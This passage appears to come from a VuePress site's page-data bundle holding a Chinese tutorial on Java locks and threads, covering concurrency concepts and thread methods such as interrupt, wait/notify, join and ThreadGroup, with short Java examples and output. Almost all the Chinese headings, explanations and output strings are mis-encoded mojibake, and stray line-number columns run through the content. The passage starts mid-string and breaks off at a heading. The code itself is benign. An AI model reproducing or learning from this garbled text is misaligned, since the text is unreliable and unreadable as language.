çº¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/base/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/01.%E5%9F%BA%E7%A1%80/1.JAVA%20%E9%94%81%20%E5%8F%8A%20%E7%BA%BF%E7%A8%8B.html",relativePath:"00.è¯­è¨/01.JAVA/01.åºç¡/1.JAVA é å çº¿ç¨.md",key:"v-2dd0fd66",path:"/language/java/base/1/",headers:[{level:2,title:"ä¸ãåºç¡æå¿µ",slug:"ä¸ãåºç¡æå¿µ",normalizedTitle:"ä¸ãåºç¡æå¿µ",charIndex:2},{level:3,title:"åæ­¥ å å¼æ­¥",slug:"åæ­¥-å-å¼æ­¥",normalizedTitle:"åæ­¥ å å¼æ­¥",charIndex:62},{level:3,title:"å¹¶å å å¹¶è¡",slug:"å¹¶å-å-å¹¶è¡",normalizedTitle:"å¹¶å å å¹¶è¡",charIndex:192},{level:3,title:"ä¸´çåº",slug:"ä¸´çåº",normalizedTitle:"ä¸´çåº",charIndex:315},{level:3,title:"é»å¡ å éé»å¡",slug:"é»å¡-å-éé»å¡",normalizedTitle:"é»å¡ å éé»å¡",charIndex:449},{level:3,title:"æ­»é é¥¥é¥¿ æ´»é",slug:"æ­»é-é¥¥é¥¿-æ´»é",normalizedTitle:"æ­»é é¥¥é¥¿ æ´»é",charIndex:535},{level:3,title:"å¹¶åççº§å«",slug:"å¹¶åççº§å«",normalizedTitle:"å¹¶åççº§å«",charIndex:772},{level:3,title:"æ é¥¥é¥¿",slug:"æ é¥¥é¥¿",normalizedTitle:"æ é¥¥é¥¿",charIndex:840},{level:3,title:"æ éç¢",slug:"æ éç¢",normalizedTitle:"æ éç¢",charIndex:844},{level:3,title:"æ é",slug:"æ é",normalizedTitle:"æ é",charIndex:848},{level:3,title:"æ ç­å¾",slug:"æ ç­å¾",normalizedTitle:"æ ç­å¾",charIndex:851},{level:3,title:"åå­æ§",slug:"åå­æ§",normalizedTitle:"åå­æ§",charIndex:2200},{level:3,title:"å¯è§æ§",slug:"å¯è§æ§",normalizedTitle:"å¯è§æ§",charIndex:2261},{level:3,title:"æåºæ§",slug:"æåºæ§",normalizedTitle:"æåºæ§",charIndex:2307},{level:2,title:"äºãçº¿ç¨",slug:"äºãçº¿ç¨",normalizedTitle:"äºãçº¿ç¨",charIndex:2382},{level:3,title:"ç¶æ",slug:"ç¶æ",normalizedTitle:"ç¶æ",charIndex:2391},{level:3,title:"suspend()æå resume()ç»§ç»­",slug:"suspend-æå-resume-ç»§ç»­",normalizedTitle:"suspend () æå resume () ç»§ç»­",charIndex:2532},{level:3,title:"stop() å¼ºè¡ç»æ­¢çº¿ç¨",slug:"stop-å¼ºè¡ç»æ­¢çº¿ç¨",normalizedTitle:"stop () å¼ºè¡ç»æ­¢çº¿ç¨",charIndex:2664},{level:3,title:"interrupt() isInterrupted()  interrupted() ä¸­æ­çº¿ç¨",slug:"interrupt-isinterrupted-interrupted-ä¸­æ­çº¿ç¨",normalizedTitle:"interrupt () isinterrupted ()  interrupted () ä¸­æ­çº¿ç¨",charIndex:null},{level:3,title:"wait() notify() notifyAll() ç­å¾åå¤é",slug:"wait-notify-notifyall-ç­å¾åå¤é",normalizedTitle:"wait () notify () notifyall () ç­å¾åå¤é",charIndex:4423},{level:3,title:"join() ç­å¾çº¿ç¨ç»æï¼yield() è°¦è®©",slug:"join-ç­å¾çº¿ç¨ç»æ-yield-è°¦è®©",normalizedTitle:"join () ç­å¾çº¿ç¨ç»æï¼yield () è°¦è®©",charIndex:4940},{level:3,title:"ThreadGroup  çº¿ç¨ç»",slug:"threadgroup-çº¿ç¨ç»",normalizedTitle:"threadgroup  çº¿ç¨ç»",charIndex:null},{level:3,title:"setDaemon() å®æ¤çº¿ç¨",slug:"setdaemon-å®æ¤çº¿ç¨",normalizedTitle:"setdaemon () å®æ¤çº¿ç¨",charIndex:6746},{level:3,title:"setPriority() çº¿ç¨ä¼åçº§",slug:"setpriority-çº¿ç¨ä¼åçº§",normalizedTitle:"setpriority () çº¿ç¨ä¼åçº§",charIndex:7196},{level:2,title:"ä¸ãvolatile",slug:"ä¸ãvolatile",normalizedTitle:"ä¸ãvolatile",charIndex:7258},{level:2,title:"åãsynchronized",slug:"åãsynchronized",normalizedTitle:"åãsynchronized",charIndex:7487},{level:2,title:"åãReentrantLock éå¥é",slug:"åãreentrantlock-éå¥é",normalizedTitle:"åãreentrantlock éå¥é",charIndex:10201},{level:3,title:"reentrantLock.lockInterruptibly() ä¸­æ­å¤ç",slug:"reentrantlock-lockinterruptibly-ä¸­æ­å¤ç",normalizedTitle:"reentrantlock.lockinterruptibly () ä¸­æ­å¤ç",charIndex:10474},{level:3,title:"reentrantLock.tryLock() éç³è¯·ç­å¾éæ¶",slug:"reentrantlock-trylock-éç³è¯·ç­å¾éæ¶",normalizedTitle:"reentrantlock.trylock () éç³è¯·ç­å¾éæ¶",charIndex:10600},{level:3,title:"ReentrantLock(true) å¬å¹³é",slug:"reentrantlock-true-å¬å¹³é",normalizedTitle:"reentrantlock (true) å¬å¹³é",charIndex:10828},{level:3,title:"Condition æ¡ä»¶",slug:"condition-æ¡ä»¶",normalizedTitle:"condition æ¡ä»¶",charIndex:11683},{level:2,title:"äºãä¿¡å·é Semaphore",slug:"äºãä¿¡å·é-semaphore",normalizedTitle:"äºãä¿¡å·é semaphore",charIndex:13273},{level:2,title:"å­ãReetrantReadWriteLock è¯»åé",slug:"å­ãreetrantreadwritelock-è¯»åé",normalizedTitle:"å­ãreetrantreadwritelock è¯»åé",charIndex:14378},{level:2,title:"ä¸ãCountDownLatch åè®¡æ¶å¨",slug:"ä¸ãcountdownlatch-åè®¡æ¶å¨",normalizedTitle:"ä¸ãcountdownlatch åè®¡æ¶å¨",charIndex:14627},{level:2,title:"å«ãCyclicBarrier å¾ªç¯æ æ ",slug:"å«ãcyclicbarrier-å¾ªç¯æ æ ",normalizedTitle:"å«ãcyclicbarrier å¾ªç¯æ æ ",charIndex:16251},{level:2,title:"ä¹ãLockSupport çº¿ç¨é»å¡å·¥å·",slug:"ä¹ãlocksupport-çº¿ç¨é»å¡å·¥å·",normalizedTitle:"ä¹ãlocksupport çº¿ç¨é»å¡å·¥å·",charIndex:17498},{level:2,title:"åãæ é",slug:"åãæ é",normalizedTitle:"åãæ é",charIndex:18720},{level:3,title:"AtomicInteger æ éçç³»ç»å®å¨æ´æ°",slug:"atomicinteger-æ éçç³»ç»å®å¨æ´æ°",normalizedTitle:"atomicinteger æ éçç³»ç»å®å¨æ´æ°",charIndex:19440},{level:3,title:"AtomicReference æ éå¯¹è±¡å¼ç¨ å AtomicStampedReference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨",slug:"atomicreference-æ éå¯¹è±¡å¼ç¨-å-atomicstampedreference-å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨",normalizedTitle:"atomicreference æ éå¯¹è±¡å¼ç¨ å atomicstampedreference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨",charIndex:20420}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¸ãåºç¡æå¿µ åæ­¥ å å¼æ­¥ å¹¶å å å¹¶è¡ ä¸´çåº é»å¡ å éé»å¡ æ­»é é¥¥é¥¿ æ´»é å¹¶åççº§å« æ é¥¥é¥¿ æ éç¢ æ é æ ç­å¾ åå­æ§ å¯è§æ§ æåºæ§ äºãçº¿ç¨ ç¶æ suspend()æå resume()ç»§ç»­ stop() å¼ºè¡ç»æ­¢çº¿ç¨ interrupt() isInterrupted()  interrupted() ä¸­æ­çº¿ç¨ wait() notify() notifyAll() ç­å¾åå¤é join() ç­å¾çº¿ç¨ç»æï¼yield() è°¦è®© ThreadGroup  çº¿ç¨ç» setDaemon() å®æ¤çº¿ç¨ setPriority() çº¿ç¨ä¼åçº§ ä¸ãvolatile åãsynchronized åãReentrantLock éå¥é reentrantLock.lockInterruptibly() ä¸­æ­å¤ç reentrantLock.tryLock() éç³è¯·ç­å¾éæ¶ ReentrantLock(true) å¬å¹³é Condition æ¡ä»¶ äºãä¿¡å·é Semaphore å­ãReetrantReadWriteLock è¯»åé ä¸ãCountDownLatch åè®¡æ¶å¨ å«ãCyclicBarrier å¾ªç¯æ æ  ä¹ãLockSupport çº¿ç¨é»å¡å·¥å· åãæ é AtomicInteger æ éçç³»ç»å®å¨æ´æ° AtomicReference æ éå¯¹è±¡å¼ç¨ å AtomicStampedReference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨",content:'# ä¸ãåºç¡æå¿µ\n\nå¨äºè§£éä¹åï¼æå¾å¤çåºç¡æå¿µéè¦åçè§£ä»¥ä¸ï¼æ¹ä¾¿ä»¥åæä»¬å¯¹åç§æåµçéçé®é¢ï¼ææ´å¥½çè®¤è¯ã\n\n\n# åæ­¥ å å¼æ­¥\n\nââ åæ­¥å°±æ¯å¤ä¸ªä»»å¡ä¸ä¸ªä¸ä¸ªæ§è¡ï¼å³ä½ å¨å­¦ä¹ çæ¶åä¸å¯è½ä¼ææ¸¸æï¼ææ¸¸æçæ¶åä¸å¯è½å¨å­¦ä¹ ã\nââ å¼æ­¥å°±æ¯ææ´è¡£æå¯ä»¥ç¨æ´è¡£æºæ´ï¼è¾¹æ´è¾¹æçµè¯ï¼èä¸æçµè¯çåæ¶è¿æ¯è½å¨åå¶ä»çäºæï¼è¿ä¸ªå°±æ¯å¼æ­¥æ§è¡ï¼ä½å¼æ­¥æ§è¡æ¯ä¸ç§ï¼å³åå³å®ç\n\n\n# å¹¶å å å¹¶è¡\n\nââ å¹¶è¡ å å¼æ­¥çä¼¼å¾åï¼ä½æå¿µæ¯å®å¨ä¸ä¸æ ·çãå¦æä¸è¿°è¯´å¼æ­¥æ¯ä¸ä¸ªäººå¯ä»¥åå¾å¤äºæï¼é£å¹¶è¡å¯ä»¥è¯´å¤ä¸ªäººåä¸åçäºæï¼å³å¤ä¸ª CPU å¤çä¸åçæä»¤æè½å«åå¹¶è¡ï¼ä¸ä¸ª CPU å¤çå¤çº¿ç¨å¹¶ä¸è½ç§°ä¹ä¸ºå¹¶è¡ï¼èæ¯å¹¶åã\n\n\n# ä¸´çåº\n\nââ ä¸´çåºç¨æ¥è¡¨ç¤ºä¸ç§å¬å±èµæºæå±äº«æ°æ®ï¼å¯ä»¥è¢«å¤ä¸ªçº¿ç¨ä½¿ç¨ãä½æ¯æ¯ä¸æ¬¡åªè½æä¸ä¸ªçº¿ç¨ä½¿ç¨å®ï¼ä¸æ¦ä¸´çåºèµæºè¢«å ç¨ï¼å¶ä»çº¿ç¨è¦æ³ä½¿ç¨è¿ä¸ªèµæºï¼å°±å¿é¡»ç­å¾ã\nââ å¨å¹¶è¡ç¨åºä¸­ï¼ä¸´çåºèµæºæ¯è¦è¢«ä¿æ¤çå¯¹è±¡ï¼å¦æèµæºåæ¶è¢«ä¸¤ä¸ªçº¿ç¨æä½ï¼åä¼å¾å°ç ´åã\n\n\n# é»å¡ å éé»å¡\n\nââ é»å¡æ¯å½ä¸´çèµæºè¢«æ¢å ï¼å¶ä»çº¿ç¨åéè¦å¨å¤ç­å¾èµæºéæ¾ï¼è¿ç§ç­å¾çè¿ç¨ç§°ä¸ºé»å¡ã\nââ éé»å¡æ¯ä¸ä¼åå ä¸ºèµæºè¢«æ¢å ï¼èä¸å»åå¶ä»äºæã\n\n\n# æ­»é é¥¥é¥¿ æ´»é\n\nââ æ­»éãé¥¥é¥¿ãæ´»éé½å±äºå¤çº¿ç¨æ´»è·æ§é®é¢ã\nââ æ­»éæ¯ä¸ä¸ªä¸¥éçç¨åºä¸è®¾è®¡åºç°çé®é¢ï¼å½ä¸ä¸ªèµæºè¢«å ç¨ï¼å ç¨åºçæå¤é®é¢ï¼å¯¼è´èµæºæ æ³è¢«éæ¾ï¼åå¶ä»çº¿ç¨å°±ä¸ç´ç­å¾é æçæåµè¢«ç§°ä¸ºæ­»éã\nââ é¥¥é¥¿æ¯ææä¸ä¸ªæèå¤ä¸ªçº¿ç¨å ä¸ºç§ç§åå æ æ³è·å¾æéçèµæºï¼å¯¼è´ä¸ç´æ æ³æ§è¡ãæ¯å¦ä»çä¼åçº§å¯è½å¤ªä½ï¼èé«ä¼åçº§ççº¿ç¨ä¸æ­æ¢å å®éè¦çèµæºï¼å¯¼è´åºä¼åçº§çº¿ç¨æ æ³å·¥ä½ã\nââ æ´»éæ¯å¤ä¸ªçº¿ç¨ä¹é´äºç¸è°¦è®©èå¯¼è´çï¼ä½ è®©ææè®©ä½ ï¼æèè¯´ä»ä»¬çº§å«ä¸æ ·å¯¼è´ã\n\n\n# å¹¶åççº§å«\n\nââ ç±äºä¸´çåºçå­å¨ï¼å¤çº¿ç¨ä¹é´çå¹¶åå¿é¡»åå°æ§å¶ãæ ¹æ®æ§å¶å¹¶åçç­ç¥ï¼æä»¬å¯ä»¥æå¹¶åççº§å«è¿è¡åç±»ï¼å¤§è´å¯ä»¥åä¸ºé»å¡ãæ é¥¥é¥¿ãæ éç¢ãæ éãæ ç­å¾å ç§ã\n\n\n# æ é¥¥é¥¿\n\nââ é¥¥é¥¿çäº§çæ¯å ä¸ºåºä¼åçº§å¨ä¸´çåºè¢«é«ä¼åçº§ççº¿ç¨æéèå¯¼è´ä¸ç´æ æ³è·åèµæº (ä¹å¯ä»¥ç§°æªéå¬å¹³é)ï¼è§£å³é¥¥é¥¿å°±æ¯è®©éåå¾å¬å¹³ï¼è¦æ³è·å¾èµæºï¼å°±å¿é¡»ä¹ä¹æéï¼ç®¡ä½ ä¼åçº§é«ä½ï¼åå°åå¾ã\n\n\n# æ éç¢\n\nââ æ éç¢æ¯ä¸ç§æå¼±çéé»å¡è°åº¦ãä¸¤ä¸ªçº¿ç¨å¦ææ¯æ éç¢çæ§è¡ï¼é£ä¹ä»ä»¬ä¸ä¼å ä¸ºä¸´çåºçé®é¢å¯¼è´ä¸æ¹è¢«æèµ·ãä¹å°±æ¯è¯´å¤§å®¶é½å¯ä»¥å¤§æå¤§æçè¿å¥ä¸´çåºï¼é£ä¹å¦æä¸èµ·ä¿®æ¹å±äº«æ°æ®ï¼ææ°æ®ä¿®æ¹åäºæä¹åï¼å¯¹äºæ éç¢ççº¿ç¨æ¥è¯´ï¼ä¸æ¦æ£æµå°è¿ç§æåµï¼å®å°±ä¼ç«å³å¯¹èªå·±æä½ççä¿®æ¹è¿è¡åæ»ï¼ç¡®ä¿æ°æ®å®å¨ãä½å¦ææ²¡ææ°æ®ç«äºåçï¼é£ä¹çº¿ç¨å°±å¯ä»¥é¡ºå©å®æèªå·±çå·¥ä½ï¼èµ°åºä¸´çåºã\nââ å¦æè¯´é»å¡çæ§å¶æ¹å¼æ¯æ²è§ç­ç¥ãä¹å°±æ¯è¯´ï¼ç³»ç»è®¤ä¸ºä¸¤ä¸ªçº¿ç¨ä¹é´å¾æå¯è½åçä¸å¹¸çå²çªï¼å æ­¤ï¼ä»¥ä¿æ¤å±äº«æ°æ®ä¸ºç¬¬ä¸ä¼åçº§ãç¸å¯¹æ¥è¯´ï¼éé»å¡çè°åº¦å°±æ¯ä¸ç§ä¹è§çç­ç¥ãå®è®¤ä¸ºå¤ä¸ªçº¿ç¨ä¹é´å¾æå¯è½ä¸ä¼åçå²çªï¼æèè¯´æ¦çä¸å¤§ï¼å æ­¤å¤§å®¶é½åºè¯¥æ éç¢çæ§è¡ï¼ä½æ¯ä¸æ¦æ£æµå°å²çªï¼å°±åºè¯¥åæ»ã\nââ ä»è¿ä¸ªç­ç¥ä¸­å¯ä»¥çå°ï¼æ éç¢çå¤çº¿ç¨ç¨åºä¸ä¸å®è½é¡ºççè¿è¡ãå ä¸ºå½ä¸´çåºä¸­å­å¨ä¸¥éçå²çªæ¶ï¼ææççº¿ç¨é½å¯è½ä¸æ­çåæ»èªå·±çæä½ï¼èæ²¡æä¸ä¸ªçº¿ç¨å¯ä»¥èµ°åºä¸´çåºï¼è¿ç§æåµä¼å½±åç³»ç»çæ­£å¸¸æ§è¡ãæä»¥ï¼æä»¬å¯è½ä¼éå¸¸å¸æå¨è¿ä¸å çº¿ç¨ä¸­ï¼è³å°å¯ä»¥æä¸ä¸ªçº¿ç¨å¨æéçæ¶é´åå®æèªå·±çæä½ï¼èéåºä¸´çåºãè¿æ ·è³å°å¯ä»¥ä¿è¯ç³»ç»ä¸ä¼åä¸´çåºä¸­æ éçç­å¾ã\nââ ä¸ç§å¯è¡çæ éç¢å®ç°å¯ä»¥ä¾èµä¸ä¸ª âä¸è´æ§æ è®°â æ¥å®ç°ãçº¿ç¨å¨æä½ä¹åï¼åè¯»åå¹¶ä¿å­è¿ä¸ªæ è®°ï¼å¨æä½å®æåï¼åæ¬¡è¯»åï¼æ£æ¥è¿ä¸ªæ è®°æ¯å¦è¢«æ´æ¹è¿ï¼å¦æè¯´ä¸¤èæ¯ä¸è´çï¼åè¯´æèµæºåºæ²¡æå²çªãå¦æä¸ä¸è´ï¼åè¯´æèµæºå¯è½å¨æä½è¿ç¨ä¸­ä¸å¶ä»åçº¿ç¨å²çªï¼éè¦éè¯æä½ãèä»»ä½å¯¹èµæºæä¿®æ¹æä½ççº¿ç¨ï¼å¨ä¿®æ¹æ°æ®åï¼é½éè¦æ´æ°è¿ä¸ªä¸è´æ§æ è®°ï¼è¡¨ç¤ºæ°æ®ä¸åå®å¨ã\n\n\n# æ é\n\nââ æ éçå¹¶è¡é½æ¯æ éç¢çãå¨æ éçæåµä¸ï¼ææççº¿ç¨é½è½å°è¯å¯¹ä¸´çåºè¿è¡è®¿é®ï¼ä½ä¸åçæ¯ï¼æ éçå¹¶åä¿è¯å¿ç¶æä¸ä¸ªçº¿ç¨è½å¤å¨æéæ¶é´åå®ææä½ç¦»å¼ä¸´çåºã\nââ å¨æ éçè°ç¨ä¸­ï¼ä¸ä¸ªå¸åçç¹ç¹æ¯å¯è½ä¼åå«ä¸ä¸ªå»ç©·å¾ªç¯ãå¨è¿ä¸ªå¾ªç¯ä¸­ï¼çº¿ç¨ä¼ä¸æ­å°è¯ä¿®æ¹å±äº«åéãå¦ææ²¡æå²çªï¼ä¿®æ¹æåï¼ç¨åºéåº ï¼å¦åç»§ç»­å°è¯ä¿®æ¹ãä½æ è®ºå¦ä½ï¼æ éçå¹¶è¡æ»è½ä¿è¯æä¸ä¸ªçº¿ç¨å¯ä»¥èåºçï¼ä¸è³äºå¨åè¦æ²¡ãè³äºä¸´çåºä¸­ç«äºå¤±è´¥ççº¿ç¨ï¼ä»ä»¬åå¿é¡»ä¸æ­éè¯ï¼ç´å°èªå·±èå©ãå¦æè¿æ°ä¸å¥½ï¼æ»æ¯å°è¯ä¸æåï¼åä¼åºç±»ä¼¼é¥¥é¥¿çç°è±¡ï¼çº¿ç¨ä¼åæ­¢ä¸åã\n\n\n# æ ç­å¾\n\nââ æ éåªè¦æ±æä¸ä¸ªçº¿ç¨å¯ä»¥å¨æéæ­¥åå®ææä½ï¼èæ ç­å¾åå¨æ éçåºç¡ä¸æ´è¿ä¸æ­¥è¿è¡æ©å±ãå®è¦æ±ææççº¿ç¨é½å¿é¡»å¨æéæ­¥åå®æï¼è¿æ ·å°±ä¸ä¼å¼èµ·é¥¥é¥¿é®é¢ãå¦æåè¿è¡ä¼åï¼è¿å¯ä»¥è¿ä¸æ­¥åè§£ä¸ºæéæ ç­å¾åçº¿ç¨æ°æ å³çæ ç­å¾å ç§ï¼ä»ä»¬ä¹åçåºå«åªæ¯å¯¹å¾ªç¯æ¬¡æ°çéå¶ä¸åã\nââ ä¸ç§å¸åçæ ç­å¾ç»æå°±æ¯ RCU (read-copy-update)ãå®çåºæ¬ææ³æ¯ï¼å¯¹æ°æ®çè¯»å¯ä»¥ä¸å æ§å¶ãå æ­¤ææçè¯»çº¿ç¨é½æ¯æ ç­å¾çï¼å®ä»¬æ¢ä¸ä¼è¢«éå®ç­å¾ä¹ä¸ä¼å¼èµ·ä»»ä½å²çªãä½å¨åæ°æ®çæ¶åï¼ååå¾åå§æ°æ®çå¯æ¬ï¼æ¥çåªä¿®æ¹å¯æ¬æ°æ®ï¼ä¿®æ¹å®æåï¼å¨åéçæ¶æºååæ°æ®ã\n\n\n# åå­æ§\n\nââ æ¯æä¸ä¸ªæä½æ¯ä¸å¯è¢«ä¸­æ­çï¼å³ä½¿å¤ä¸ªçº¿ç¨ä¸èµ·æ§è¡çæ¶åï¼ä¸ä¸ªæä½ä¸æ¦å¼å§ï¼å°±ä¸ä¼è¢«å¶ä»çº¿ç¨å¹²æ°ã\n\n\n# å¯è§æ§\n\nââ æå½ä¸ä¸ªçº¿ç¨ä¿®æ¹äºå±äº«åéçå¼ï¼å¶ä»çº¿ç¨æ¯å¦è½å¤ç«å³ç¥éè¿ä¸ªä¿®æ¹ã\n\n\n# æåºæ§\n\nââ æåºæ§çé®é¢æ¯å ä¸ºå¨ç¨åºæ§è¡æ¶ï¼å¯è½ä¼è¿è¡æä»¤çéæï¼éæåçæä»¤ä¸åæä»¤çé¡ºåºæªå¿ä¸è´ã(è¿ç§æåµä¼åºç°å¨å¹¶åç¨åºè®¾è®¡ä¸­)\n\n\n# äºãçº¿ç¨\n\n\n# ç¶æ\n\nNEW æ°å»ºï¼\nRUNNABLE å¯è¿è¡ç¶æï¼\nBLOCKED é»å¡ (éå° synchronizedï¼ç´å°è·å¾é)ï¼\nWAITING æ æ¶é´çç­å¾ (wait (),notify ())ï¼\nTIMED_WAITING ææ¶é´çç­å¾ï¼\nTERMINATED ç»æã\n\n\n# suspend () æå resume () ç»§ç»­\n\nââ å­é¢ææï¼ä½ suspend () ä¸ä¼éæ¾éï¼å¿é¡»è°ç¨ resume () æè½éæ¾éï¼ä½æ¯å¦ææå¤ç resume () æ¯ suspend () æåæ§è¡ï¼åå¶ä»çº¿ç¨æ°¸è¿ç­å¾ï¼åä¸ºæ­»éã\n\n\n# stop () å¼ºè¡ç»æ­¢çº¿ç¨\n\nââ Thread.stop (); å¼ºè¡ç»æ­¢çº¿ç¨ï¼ä¼å¯¼è´æ°æ®ä¸ä¸è´ï¼ç ´åæ°æ®ã\n\n\n# interrupt () isInterrupted () interrupted () ä¸­æ­çº¿ç¨\n\nââ Thread.interrupt () ä¸­æ­çº¿ç¨ï¼ä¹å°±æ¯è®¾ç½®ä¸­æ­æ å¿ä½ãThread.isInterrupted () å¤æ­å½åçº¿ç¨æ¯å¦è¢«ä¸­æ­ã Thread.interrupted () ä¹æ¯ç¨æ¥å¤æ­å½åçº¿ç¨çä¸­æ­ç¶æãå¦æå¨çº¿ç¨ä¸­ä½¿ç¨äº Thread.sleep ()ï¼é£ä¹è¦ä¸­æ­ä¸ä¸ªçº¿ç¨å¿é¡»ä¹å¨ Thread.sleep () ç catch è¯­å¥ä¸­ å¨æ§è¡ä¸æ¬¡å½åçº¿ç¨çä¸­æ­ã\n\n> Thread.sleep () æ¹æ³ç±äºä¸­æ­èæåºå¼å¸¸ï¼æ­¤æ¶ï¼ä»ä¼æ¸é¤ä¸­æ­æ å¿ï¼å¦æä¸å å¤çï¼é£ä¹å¨ä¸æ¬¡æ§è¡çº¿ç¨æ¶ï¼å°±æ æ³å¤æ­è¿ä¸ªä¸­æ­æ å¿ï¼ä¼ç»§ç»­æ§è¡çº¿ç¨ï¼å¹¶ä¸ä¼è¾¾å°ä¸­æ­çº¿ç¨ã\n> ä¸­æ­æ¯ä¸ä¼éæ¾éçã\n\n    public static void main(String[] args) throws InterruptedException {\n        String a = "1";\n        Thread[] threads = new Thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new Thread(() -> {\n                while (true) {\n                    synchronized (a) {\n                        try {\n                            System.out.println("çº¿ç¨å¯å¨ " + b);\n                            if (Thread.currentThread().isInterrupted()) {\n                                System.out.println("çº¿ç¨ä¸­æ­" + b);\n                                break;\n                            }\n                            Thread.sleep(5000);\n                            System.out.println("æ§è¡å®æ¯ " + b);\n                        } catch (InterruptedException e) {\n                            System.out.println("èå­è¢«ä¸­æ­äº " + b);\n                            // è¿éå¿é¡»å¨ä¸­æ­ä¸æ¬¡ï¼å¦å\n                            Thread.currentThread().interrupt();\n                        }\n                    }\n                }\n            });\n        }\n        threads[0].start();\n        Thread.sleep(2000);\n        threads[0].interrupt();\n        threads[1].start();\n    }\nè¾åºç»æï¼\nçº¿ç¨å¯å¨ 0\nèå­è¢«ä¸­æ­äº 0\nçº¿ç¨å¯å¨ 0\nçº¿ç¨ä¸­æ­0\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\nçº¿ç¨å¯å¨ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# wait () notify () notifyAll () ç­å¾åå¤é\n\nââ å¦æä¸ä¸ªçº¿ç¨è°ç¨äº object.wait ()ï¼é£ä¹å®å°±ä¼è¿å¥ object å¯¹è±¡çç­å¾éåï¼è¿ä¸ªç­å¾éåä¸­å¯è½ä¼æå¤ä¸ªçº¿ç¨ï¼å ä¸ºç³»ç»è¿è¡å¤ä¸ªçº¿ç¨åæ¶ç­å¾æä¸ä¸ªå¯¹è±¡ãå½ object.notify () è¢«è°ç¨æ¶ï¼å®å°±ä¼ä»è¿ä¸ªç­å¾éåä¸­ï¼éæºéæ©ä¸ä¸ªçº¿ç¨ï¼å¹¶å°å¶å¤éãéè¦å¤§å®¶æ³¨æçæ¯è¿ä¸ªéæ©æ¯ä¸å¬å¹³çï¼å¹¶ä¸æ¯åç­å¾ççº¿ç¨ä¼ä¼åè¢«éæ©ï¼è¿ä¸ªéæ©å®å¨æ¯éæºçãobject.notifyAll () å®å notify () çåè½åºæ¬ä¸è´ï¼ä½ä¸åçæ¯ï¼å®ä¼å¤éå¨è¿ä¸ªç­å¾éåä¸­ææç­å¾ççº¿ç¨ï¼èä¸æ¯éæºéæ©ä¸ä¸ªã\nââ object.wait () å object.notify () å¿é¡»å¨å¯¹åºç synchronized è¯­å¥ä¸­ï¼éè¦é¦åè·å¾ç®æ å¯¹è±¡çä¸ä¸ªçè§å¨ã\n\n> wait () æ¹æ³åªä¼éæ¾å½åå¯¹è±¡çéï¼ä¸ä¼éæ¾ææéã\n> notify () ä¸ä¼ç«å»ç«å»éæ¾ sycronizedï¼objï¼ä¸­ç obj éï¼å¿é¡»è¦ç­ notify () æå¨çº¿ç¨æ§è¡å®å®¹ synchronizedï¼objï¼åä¸­çææä»£ç æä¼éæ¾è¿æéã\n\n\n# join () ç­å¾çº¿ç¨ç»æï¼yield () è°¦è®©\n\n    public volatile static int i = 0;\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread thread = new Thread(() -> {\n            for(i=0;i<100000;i++);\n        });\n        thread.start();\n        thread.join();\n        System.out.println(i);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nââ join () ä¼ä¸ç´é»å¡çº¿ç¨ç´å°ç®æ çº¿ç¨æ§è¡å®æ¯ãå¦æä¸ä½¿ç¨ join () ç­å¾ threadï¼é£ä¹å¾å°ç i å¾å¯è½æ¯ 0 æèä¸ä¸ªéå¸¸å°çæ°å­ãå ä¸º thread è¿æ²¡å¼å§æ§è¡ï¼i çå¼å°±å·²ç»è¢«è¾åºäºã\nââ yield () ä¼ä½¿å½åçº¿ç¨è®©åº CPUãä½è®©åº CPU å¹¶ä¸ä»£è¡¨å½åçº¿ç¨ä¸æ§è¡äºãå½åçº¿ç¨è®©åº CPU åï¼ä¼è¿è¡ CPU èµæºçäºå¤ºï¼ä½æ¯å¦è½å¤åæ¬¡è¢«åéï¼å°±ä¸ä¸å®äºãå¦æä½ è§å¾ä¸ä¸ªçº¿ç¨ä¸é£ä¹éè¦ï¼æèä¼åçº§éå¸¸ä½ï¼èä¸åå®³æå®ä¼å ç¨å¤ªå¤ç CPU èµæºï¼é£ä¹å¯ä»¥å¨éå½çæ¶åè°ç¨ yield () ï¼ç»äºå¶ä»éè¦çº¿ç¨æ´å¤çå·¥ä½æºä¼ã\n\n> yield ä¸ä¼éæ¾éï¼éæ§è¡å®æ¯\n\n\n# ThreadGroup çº¿ç¨ç»\n\n    public static void main(String[] args) throws InterruptedException {\n        ThreadGroup threadGroup = new ThreadGroup("è®¢åç»");\n        Thread t1 = new Thread(threadGroup,() -> {\n            String name = Thread.currentThread().getName();\n            try {\n                Thread.sleep(5000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println("å½åçº¿ç¨åç§° :" + name);\n        },"ä¸å");\n        Thread t2 = new Thread(threadGroup,() -> {\n            String name = Thread.currentThread().getName();\n            try {\n                Thread.sleep(5000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println("å½åçº¿ç¨åç§° :" + name);\n        },"åæ¶è®¢å");\n        t1.start();\n        t2.start();\n        System.out.println(threadGroup.activeCount());\n        threadGroup.list();\n    }\n\nç»æï¼\n2\njava.lang.ThreadGroup[name=è®¢åç»,maxpri=10]\n    Thread[ä¸å,5,è®¢åç»]\n    Thread[åæ¶è®¢å,5,è®¢åç»]\nå½åçº¿ç¨åç§° :åæ¶è®¢å\nå½åçº¿ç¨åç§° :ä¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# setDaemon () 